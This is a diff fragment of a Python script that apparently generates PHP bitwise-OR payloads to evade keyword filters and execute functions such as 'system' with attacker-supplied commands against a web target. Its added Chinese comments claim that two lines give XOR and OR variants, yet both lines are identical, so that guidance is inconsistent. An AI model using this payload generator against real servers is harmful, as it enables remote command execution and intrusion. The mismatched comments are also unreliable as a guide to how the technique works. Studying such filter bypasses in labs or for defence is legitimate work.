@@ -33,11 +33,15 @@ def action(arg):
                 s2 += t[6:9]
                 break
         f.close()
+
+    #   改为  output = "(\"" + s1 + "\"|\"" + s2 + "\")"  则为异或绕过
+    #   改为  output = "(\"" + s1 + "\"|\"" + s2 + "\")"  则为或绕过
     output = "(\"" + s1 + "\"|\"" + s2 + "\")"
     return (output)
 
 
 while True:
+    #   直接输入 函数即可，不需要输入括号.  比如:   system
     param = action(input("\n[+] your function：")) + action(input("[+] your command："))
     print(param, "\n")
     data = {
